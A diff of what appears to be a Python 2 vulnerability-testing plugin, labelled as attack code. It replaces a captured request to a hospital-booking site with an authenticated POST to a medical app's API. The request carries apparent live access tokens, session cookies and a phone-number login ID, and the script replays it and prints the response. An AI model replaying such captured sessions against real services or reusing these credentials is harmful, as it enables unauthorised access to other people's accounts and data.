@@ -2,15 +2,19 @@
 #coding=utf-8
 import re
 
-baseUrl = 'http://app.wy.guahao.com/checklogin'
-raw = '''GET /checklogin?to=http%3A%2F%2Fapp.wy.guahao.com%2Fstandardepartment%2F7f67f180-cff3-11e1-831f-5cf9dd2e7135&token= HTTP/1.1
-Host: app.wy.guahao.com
-Accept-Encoding: gzip, deflate
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Cookie: _wysid_=145208767747220178067201
+baseUrl = 'http://api.doctorpda.cn'
+raw = '''POST /api/v2/case/index?app_key=f1c18i2otirc0004&client_id=0bd1agocekr6073a&access_token=c83ad482-b05c-4187-9c07-566454b0b168&net=wifi&versionName=4.2.2&versionCode=85&source=app HTTP/1.1
+Host: api.doctorpda.cn
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
 Connection: keep-alive
-Accept-Language: zh-cn
-User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13B143 MWYBrowser/2.3.9
+Cookie: JSESSIONID=5D676C5FFC64A8A1F6970744275F6A32; JSESSIONID=5D676C5FFC64A8A1F6970744275F6A32; login_id=15221131593; secret_token=84bc894eada38d0b24fbcfd6163b914b
+User-Agent: new_doctorpda/4.2.2 (iPhone; iOS 9.2; Scale/2.00) doctorpda
+Accept-Language: zh-Hans-CN;q=1
+Accept-Encoding: gzip, deflate
+Content-Length: 51
+
+data=sQh4bt25KD2cdxQlfrrOkFBPumJn2HZ44hqH7hAfubk%3D
 '''
 
 
@@ -20,11 +24,12 @@ def assign(service, arg):
 
 # 主体攻击代码
 def audit(arg):
-    code, head, body, errcode, final_url = curl.curl2(arg, raw)
-    print body
-
+    try:
+        code, head, body, errcode, final_url = curl.curl2(arg, raw)
+    except Exception, e:
+        print e
     # 输出错误信息
-    # outPutErrInfo(code, head, body, errcode, final_url)
+    outPutErrInfo(code, head, body, errcode, final_url)
 
 
 # 输出错误信息
@@ -36,8 +41,8 @@ def outPutErrInfo(code, head, body, errcode, final_url):
     print'---------------HTTPHead---------------'
     print head
     # 以下显示HTTP主体内容(HTML)
-    # print'---------------HTTPBody---------------'
-    # print body
+    print'---------------HTTPBody---------------'
+    print body
     # 以下显示curl的状态码
     print'-------------err code-------------'
     print errcode
